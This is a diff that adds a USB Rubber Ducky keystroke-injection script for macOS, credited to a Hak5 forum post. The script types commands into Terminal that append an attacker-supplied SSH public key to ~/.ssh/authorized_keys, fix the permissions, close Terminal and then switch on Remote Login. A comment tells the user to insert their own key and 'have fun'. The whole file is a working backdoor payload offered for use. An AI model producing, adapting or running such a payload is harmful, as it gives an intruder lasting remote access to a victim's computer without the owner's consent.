@@ -1,0 +1,35 @@
+REM Originally from: https://forums.hak5.org/index.php?/topic/36798-payload-osx-ssh-keyless-entry-plus-remote-login-enabled/
+REM Replace 'ssh-rsa' with your public key and have fun
+REM code by ESC
+DELAY 1000
+COMMAND SPACE
+DELAY 500
+STRING Terminal
+DELAY 500
+ENTER
+DELAY 800
+STRING mkdir -p ~/.ssh/
+DELAY 30
+ENTER
+STRING chmod 700 ~/.ssh
+DELAY 30
+ENTER
+STRING echo 'ssh-rsa' >> ~/.ssh/authorized_keys
+DELAY 1500
+ENTER
+STRING chmod 600 ~/.ssh/authorized_keys
+ENTER
+DELAY 100
+STRING killall Terminal
+ENTER
+CONTROL F7
+COMMAND SPACE
+DELAY 100
+STRING remote login
+DELAY 100
+ENTER
+DELAY 75
+TAB
+TAB
+SPACE
+COMMAND Q
